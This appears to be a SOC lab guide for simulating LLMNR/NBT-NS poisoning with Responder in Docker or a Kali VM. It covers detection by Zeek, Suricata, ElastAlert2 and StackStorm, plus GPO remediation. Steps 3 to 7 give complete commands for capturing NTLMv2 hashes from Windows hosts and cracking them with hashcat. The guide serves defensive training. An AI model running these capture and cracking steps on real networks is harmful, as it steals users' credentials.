# Responder Red Team Guide — Kali Linux VM + Docker
## SOC Lab: Credential Capture Simulation (T1557.001)

> ⚠️ **ISOLATED LAB ONLY** — Never run Responder on production or corporate networks.
> LLMNR/NBT-NS poisoning is illegal on networks you don't own.

---

## What is Responder?
Responder poisons LLMNR, NBT-NS, and mDNS broadcasts on the local LAN.
When a Windows host fails to resolve a hostname via DNS, it broadcasts an LLMNR query.
Responder answers "that's me!" and captures the NTLMv2 hash the Windows host sends for authentication.

**MITRE ATT&CK:** T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning

**What SOC detects:**
- Zeek: UDP traffic on port 5355 (LLMNR) from unexpected hosts
- Suricata: `LLMNR Poisoning Attempt` rule fires
- ElastAlert2: `T1557_responder.yml` rule creates StackStorm ticket
- StackStorm: Playbook `04_responder_response.py` checks Caldera for authorized red team

---

## Setup Option A — Docker (Integrated with SOC Lab)

```bash
# Already configured in docker-compose.yml as "responder" service
# Profile: redteam — only starts when explicitly requested

# Start Responder container
docker compose --profile redteam up responder -d

# Watch captured hashes in real-time
docker exec -it responder tail -f /opt/responder/logs/NTLMv2-Client.log

# Stop Responder
docker compose --profile redteam stop responder
```

---

## Setup Option B — Kali Linux VM

### Step 1 — VM Setup
```
VM: Kali Linux 2024.1 (download: kali.org/get-kali)
RAM: 4 GB minimum
Disk: 40 GB
Network: Host-only adapter (same subnet as lab targets)
           → VirtualBox: Settings → Network → Adapter 1 → Host-only
           → VMware: Settings → Network Adapter → Custom (VMnet subnet)
```

### Step 2 — Install Responder on Kali
```bash
# Kali has Responder pre-installed — verify:
which responder
responder --version

# If missing:
sudo apt-get update && sudo apt-get install responder -y

# OR install from source (latest):
cd /opt
sudo git clone https://github.com/lgandx/Responder.git
cd Responder
sudo pip3 install netifaces
```

### Step 3 — Configure Responder for SOC Lab
```bash
# Edit /etc/responder/Responder.conf (or /opt/Responder/Responder.conf)
sudo nano /etc/responder/Responder.conf

# Set:
# Challenge = 1122334455667788  (fixed — needed for offline cracking)
# HTTP = On
# SMB  = On
# LDAP = On
# MDNS = On
```

### Step 4 — Run Responder
```bash
# Find your lab interface
ip addr show | grep -E "eth|ens|enp"

# Run Responder — replace eth0 with your interface
sudo responder -I eth0 -wrf

# Flags:
#  -I eth0   interface to listen on
#  -w        WPAD rogue proxy
#  -r        NBT-NS answers for WORKSTATION type
#  -f        fingerprint hosts
#  -v        verbose (add for debugging)

# You should see:
# [+] Listening for events...
# [*] [LLMNR] Poisoned answer sent to 192.168.10.x for name NONEXISTENT-HOST
# [SMB] NTLMv2-SSP Hash captured from 192.168.10.50::LAB\jdoe:...
```

### Step 5 — Trigger LLMNR from Windows (Victim)
```powershell
# On a Windows VM on the same subnet — browse to non-existent host:
net use \\NONEXISTENT-FILE-SERVER\share

# OR in File Explorer, type in address bar:
\\FILESERVER-DOESNT-EXIST

# OR PowerShell:
Test-NetConnection SHAREPOINT-LAB

# Responder will capture the NTLMv2 hash
```

### Step 6 — View Captured Hashes
```bash
# Real-time view
tail -f /var/log/responder/NTLMv2-Client.log

# All captured hashes
ls -la /var/log/responder/
cat /var/log/responder/NTLMv2-Client.log

# Example hash format (for offline cracking with Hashcat):
# jdoe::LAB:1122334455667788:HASH_VALUE:CHALLENGE_VALUE
```

### Step 7 — Crack Hashes with Hashcat (optional lab exercise)
```bash
# On Kali (CPU mode — GPU not needed for lab)
hashcat -m 5600 /var/log/responder/NTLMv2-Client.log /usr/share/wordlists/rockyou.txt

# -m 5600 = NTLMv2
# Results appear as: jdoe::LAB:...:Password123

# Check status
hashcat --status
```

---

## SOC Blue Team Response

When Responder runs, the SOC should:

1. **Zeek alert fires** → `resp_p:5355 UDP` from unexpected host
2. **ElastAlert2 T1557_responder rule** → fires within 30 seconds
3. **StackStorm playbook `04_responder_response.py`** runs:
   - Checks Caldera API: is this an authorized red team operation?
   - If YES: log as authorized, notify SOC team, no blocking
   - If NO: block source IP, create IRIS case, alert CISO
4. **DFIR-IRIS case** created with LLMNR poisoning details
5. **AI agents triggered**: Threat Analyst enriches source IP via MISP

---

## Remediation (GPO — Disable LLMNR/NBT-NS)

After detection, SOC recommends:

```
# Group Policy — Disable LLMNR
Computer Config → Admin Templates → Network → DNS Client
→ "Turn off multicast name resolution" = ENABLED

# Group Policy — Disable NBT-NS
Computer Config → Admin Templates → Network → WINS
→ "Enable NetBIOS settings" = Disabled

# PowerShell (per-host workaround)
$adapter = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled }
$adapter.SetTcpipNetbios(2)  # 2 = Disable NetBIOS over TCP/IP
```

---

## Lab Exercise Checklist

- [ ] Deploy Responder (Docker or Kali VM)
- [ ] Verify SOC dashboard shows Zeek LLMNR traffic
- [ ] Confirm ElastAlert2 T1557 rule fires within 2 minutes
- [ ] Check StackStorm playbook executed (ST2 UI → History)
- [ ] Verify IRIS case created with correct severity
- [ ] View AI agent analysis (CrewAI → /jobs endpoint)
- [ ] Attempt hash cracking with Hashcat
- [ ] Apply GPO remediation on Windows VM
- [ ] Confirm LLMNR traffic stops in Zeek after GPO applied
